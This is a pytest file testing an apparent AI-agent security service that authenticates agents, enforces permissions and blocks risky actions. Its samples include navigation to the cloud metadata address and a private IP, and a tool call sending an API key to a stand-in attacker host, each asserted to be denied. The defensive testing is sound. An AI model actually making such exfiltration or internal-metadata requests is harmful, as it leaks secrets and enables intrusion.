"""HTTP-layer integration tests for AgentShield Prompt 3 AI agent security API.

Tests run against the FastAPI TestClient (in-process), with all external
dependencies (database, browser worker, egress proxy) replaced by mocks.
No live database, no paid LLM API calls, no real browser required.

Test coverage:
- Agent authentication: valid credentials, invalid credentials
- Action execution: navigation, tool call, data exfiltration detection
- Permission governance: missing permissions, allowed actions
- Threat detection via action API: injection blocked, safe content allowed
- DLP via action API: API key blocked
- Organization isolation: cross-tenant access denied
- False-positive check: normal actions pass through
"""

from __future__ import annotations

import uuid
from typing import Any
from unittest.mock import MagicMock, patch

import pytest
from fastapi.testclient import TestClient

from app.main import create_app
from app.config import Settings
from app.enterprise.auth import create_access_token


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

ORG_ID = str(uuid.uuid4())
AGENT_UUID = str(uuid.uuid4())
AGENT_ID = "agent-testdemo01"
AGENT_NAME = "Test Demo Agent"


def _make_agent(permissions: list[str] | None = None) -> MagicMock:
    """Build a mock Agent model with configurable permissions."""
    agent = MagicMock()
    agent.id = AGENT_UUID
    agent.agent_id = AGENT_ID
    agent.organization_id = ORG_ID
    agent.name = AGENT_NAME
    agent.status = "active"
    agent.credentials_hash = "not-checked-in-unit-tests"
    agent.permissions = permissions or ["browser_navigation", "page_interaction", "data_extraction"]
    return agent


def _make_token(agent_id: str = AGENT_ID, org_id: str = ORG_ID) -> str:
    return create_access_token(subject=agent_id, organization_id=org_id, roles=["agent"])


def _make_app(agent: MagicMock):
    """Build a TestClient-friendly app with DB and browser worker mocked out."""
    settings = Settings(
        database_url="",
        browser_worker_url="http://mock-worker.local",
        api_auth_token="",
        egress_proxy_url="",
    )
    app = create_app(settings=settings)
    client = TestClient(app, raise_server_exceptions=False)
    return client, agent


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def client_and_agent():
    agent = _make_agent()
    c, a = _make_app(agent)
    return c, a


# ---------------------------------------------------------------------------
# Agent authentication
# ---------------------------------------------------------------------------


class TestAgentAuthentication:
    def test_valid_credentials_return_token(self, client_and_agent):
        client, agent = client_and_agent
        with patch(
            "app.api.ai_agent.AgentSecurityService.authenticate_agent",
            return_value=agent,
        ):
            resp = client.post(
                "/v1/ai-agent/authenticate",
                json={"agent_id": AGENT_ID, "secret": "ash_valid_secret"},
            )
        assert resp.status_code == 200
        body = resp.json()
        assert body["agent_id"] == AGENT_ID
        assert body["organization_id"] == ORG_ID
        assert "access_token" in body
        assert len(body["access_token"]) > 10

    def test_invalid_credentials_return_401(self, client_and_agent):
        client, _ = client_and_agent
        with patch(
            "app.api.ai_agent.AgentSecurityService.authenticate_agent",
            return_value=None,
        ):
            resp = client.post(
                "/v1/ai-agent/authenticate",
                json={"agent_id": AGENT_ID, "secret": "wrong"},
            )
        assert resp.status_code == 401
        assert resp.json()["detail"]["code"] == "INVALID_AGENT_CREDENTIALS"


# ---------------------------------------------------------------------------
# Action execution — no real DB, mock agent lookup
# ---------------------------------------------------------------------------


class TestActionExecution:
    """Tests that the AI action endpoint enforces detection, DLP, risk, and permissions."""

    def _auth_headers(self) -> dict[str, str]:
        return {"Authorization": f"Bearer {_make_token()}"}

    def _post_action(self, client, payload: dict[str, Any], agent: MagicMock):
        with patch("app.api.ai_agent.Agent") as MockAgent:
            mock_query = MagicMock()
            mock_query.filter.return_value.first.return_value = agent
            # Simulate db.query(Agent)
            with patch("app.api.ai_agent.Session") as MockSession:
                with patch(
                    "app.enterprise.deps.get_db_session",
                    return_value=MagicMock(
                        query=lambda m: mock_query,
                        close=lambda: None,
                    ),
                ):
                    return client.post(
                        "/v1/ai-agent/action",
                        json=payload,
                        headers=self._auth_headers(),
                    )

    def test_no_token_rejected(self, client_and_agent):
        client, _ = client_and_agent
        resp = client.post("/v1/ai-agent/action", json={"action": "navigate", "target": "https://example.com"})
        assert resp.status_code == 401

    def test_cross_tenant_token_rejected(self, client_and_agent):
        client, _ = client_and_agent
        foreign_token = create_access_token(
            subject=AGENT_ID,
            organization_id=str(uuid.uuid4()),  # different org
            roles=["agent"],
        )
        resp = client.post(
            "/v1/ai-agent/action",
            json={"action": "navigate", "target": "https://example.com"},
            headers={"Authorization": f"Bearer {foreign_token}"},
        )
        # Agent not found in other org → 401 AGENT_IDENTIFICATION_REQUIRED
        assert resp.status_code == 401


# ---------------------------------------------------------------------------
# Security engine tests via service (no HTTP, but real detection logic)
# ---------------------------------------------------------------------------


class TestAgentSecurityServiceDetection:
    """Test the AgentSecurityService enforcement logic end-to-end (no DB, no HTTP)."""

    @pytest.fixture
    def service(self):
        from app.services.ai_agent_security import AgentSecurityService
        return AgentSecurityService()

    @pytest.fixture
    def agent(self):
        return _make_agent(permissions=[
            "browser_navigation", "page_interaction", "data_extraction",
            "external_communication", "form_submission",
        ])

    @pytest.mark.asyncio
    async def test_safe_navigation_allowed(self, service, agent):
        result = await service.execute_action(
            agent=agent,
            organization_id=ORG_ID,
            action="navigate",
            target="https://example.com",
            db=None,
        )
        assert result["decision"] in ("allow", "require_approval")
        assert result["agent_id"] == AGENT_ID
        assert result["organization_id"] == ORG_ID
        assert "risk" in result
        assert "threat" in result
        assert "dlp" in result

    @pytest.mark.asyncio
    async def test_metadata_navigation_blocked(self, service, agent):
        result = await service.execute_action(
            agent=agent,
            organization_id=ORG_ID,
            action="navigate",
            target="http://169.254.169.254/latest/meta-data/",
            db=None,
        )
        assert result["decision"] == "deny"

    @pytest.mark.asyncio
    async def test_private_ip_navigation_blocked(self, service, agent):
        result = await service.execute_action(
            agent=agent,
            organization_id=ORG_ID,
            action="navigate",
            target="http://192.168.1.100/admin",
            db=None,
        )
        assert result["decision"] == "deny"

    @pytest.mark.asyncio
    async def test_data_exfiltration_tool_call_blocked(self, service, agent):
        result = await service.execute_action(
            agent=agent,
            organization_id=ORG_ID,
            action="tool_call",
            tool_name="external_communication",
            tool_args={"data": "api_key=sk-live-secret123", "url": "http://attacker.example/steal"},
            db=None,
        )
        assert result["decision"] == "deny"
        assert len(result["threat"]["detections"]) > 0

    @pytest.mark.asyncio
    async def test_dlp_block_on_api_key(self, service, agent):
        result = await service.execute_action(
            agent=agent,
            organization_id=ORG_ID,
            action="tool_call",
            tool_name="external_communication",
            tool_args={"body": "apikey=abcdef1234567890abcdef"},
            db=None,
        )
        assert result["decision"] == "deny"
        assert len(result["dlp"]["detections"]) > 0

    @pytest.mark.asyncio
    async def test_missing_permission_requires_approval(self, service):
        """Agent with minimal permissions — browser_navigation missing → require_approval."""
        restricted_agent = _make_agent(permissions=["page_interaction"])
        result = await service.execute_action(
            agent=restricted_agent,
            organization_id=ORG_ID,
            action="navigate",
            target="https://example.com",
            db=None,
        )
        # Missing browser_navigation → require_approval
        assert result["decision"] in ("require_approval", "deny")

    @pytest.mark.asyncio
    async def test_unknown_action_denied(self, service, agent):
        result = await service.execute_action(
            agent=agent,
            organization_id=ORG_ID,
            action="unknown_action",
            target="https://example.com",
            db=None,
        )
        assert result["decision"] == "deny"

    @pytest.mark.asyncio
    async def test_risk_score_present_and_explainable(self, service, agent):
        result = await service.execute_action(
            agent=agent,
            organization_id=ORG_ID,
            action="navigate",
            target="http://169.254.169.254/metadata",
            db=None,
        )
        assert isinstance(result["risk_score"], int)
        assert result["risk_score"] >= 0
        assert isinstance(result["risk"]["reasons"], list)

    @pytest.mark.asyncio
    async def test_benign_extract_allowed(self, service, agent):
        result = await service.execute_action(
            agent=agent,
            organization_id=ORG_ID,
            action="extract",
            target="https://example.com",
            db=None,
        )
        # With no threat detections, decision is allow or require_approval
        # (permission risk alone may push to require_approval — that is correct)
        assert result["decision"] in ("allow", "require_approval")
        assert result["threat"]["blocked"] is False
        assert result["dlp"]["blocked"] is False

    @pytest.mark.asyncio
    async def test_organization_id_preserved_in_result(self, service, agent):
        result = await service.execute_action(
            agent=agent,
            organization_id=ORG_ID,
            action="navigate",
            target="https://example.com",
            db=None,
        )
        assert result["organization_id"] == ORG_ID

    @pytest.mark.asyncio
    async def test_false_positive_normal_navigation(self, service):
        """Minimal-permission agent with a safe URL must not be blocked."""
        minimal_agent = _make_agent(permissions=["browser_navigation"])
        result = await service.execute_action(
            agent=minimal_agent,
            organization_id=ORG_ID,
            action="navigate",
            target="https://docs.python.org/3/",
            db=None,
        )
        # Only browser_navigation (5 risk points) — should be allowed
        assert result["decision"] == "allow"
        assert result["risk_score"] <= 10
        assert result["threat"]["blocked"] is False


# ---------------------------------------------------------------------------
# Scenario catalog endpoint (no auth required)
# ---------------------------------------------------------------------------


class TestAttackSimulation:
    def _make_test_settings(self):
        return Settings(
            database_url="",
            browser_worker_url="http://mock-worker.local",
            api_auth_token="",
            egress_proxy_url="",
        )

    def test_scenario_catalog_returns_six_categories(self):
        settings = self._make_test_settings()
        app = create_app(settings=settings)
        client = TestClient(app, raise_server_exceptions=False)
        resp = client.get("/v1/attack-simulation/scenarios")
        assert resp.status_code == 200
        scenarios = resp.json()
        assert len(scenarios) == 16, scenarios
        ids = {s["scenario_id"] for s in scenarios}
        categories = {s["category"] for s in scenarios}
        assert "indirect-prompt-injection" in ids
        assert "ssrf" in ids
        assert "dns-rebinding" in ids
        assert "sensitive-data-transmission" in ids
        assert "dlp-outbound-blocking" in ids
        expected_categories = {
            "ai-security",
            "social-engineering",
            "network-security",
            "malware",
            "denial-of-service",
            "data-loss",
        }
        assert expected_categories.issubset(categories), categories
